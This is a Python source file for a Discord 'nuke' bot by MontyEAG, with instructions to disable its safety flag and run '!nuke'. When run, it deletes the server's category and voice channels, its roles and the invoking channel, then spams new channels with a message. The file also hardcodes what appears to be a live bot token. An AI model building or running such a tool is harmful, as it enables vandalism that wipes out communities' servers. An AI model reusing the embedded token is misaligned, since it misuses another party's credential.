"""
 _ _  _ _  _ __ ___  ___ 
| \ || | || / /| __>| . \
|   || ' ||  \ | _> |   /
|_\_|`___'|_\_\|___>|_\_\

Developed by: MontyEAG                         
"""



########################
# How to activate bot. #
########################
# First, turn off the safety, you can do this in the config below.
#
# Last, you run the command "!nuke", you can add the following parameters:
# "!nuke (Amount of channels) (Text in channels)"
#########################


##########
# CONFIG #
##########

safety = True # When set to "True" instead of "False" it will not allow the bot to proceed with the nuke.

bot_token = 'MTE5Mjg4MzUwMzg1NjExMTYzNg.Gv7kHb.Mm4-T73IO2KVbgl0lswWJVxBIJjXjbawX12Vao' # You can get your bot token through the discord developer website.

#####################################################
# DO NOT EDIT BELOW UNLESS YOU KNOW WHAT YOUR DOING #
#####################################################
import discord
from discord.ext import commands

intents = discord.Intents.all()
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

default_text = "This server was nuked using a bot developed by MontyEAG. If this was done without your permission, please don't harrass MontyEAG as the code is public and open for anyone to use."

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")


@bot.command()
async def nuke(ctx, channel_amount: int = 1, *, channel_text=default_text):
    ctx.message.delete()
    if safety:
        await ctx.author.send("SAFETY IS ON.")
    else:
        guild = ctx.guild
        channels = guild.channels

        for channel in channels:
            if isinstance(channel, discord.CategoryChannel) or isinstance(channel, discord.VoiceChannel):
                try:
                    await channel.delete()
                except discord.HTTPException as e:
                    print(e)

        for role in guild.roles:
            try:
                await role.delete()
            except discord.HTTPException as e:
                print(e)

        try:
            await ctx.channel.delete() 
        except discord.HTTPException as e:
            print(e)

        while channel_amount > 0:
            try:
                nuke_channel = await guild.create_text_channel(name=f'Nuked by: {ctx.author.name}')
                await nuke_channel.send(channel_text)
            except discord.HTTPException as e:
                print(e)
            channel_amount -= 1
try:
    bot.run(bot_token)
except Exception as e:
    print(e)
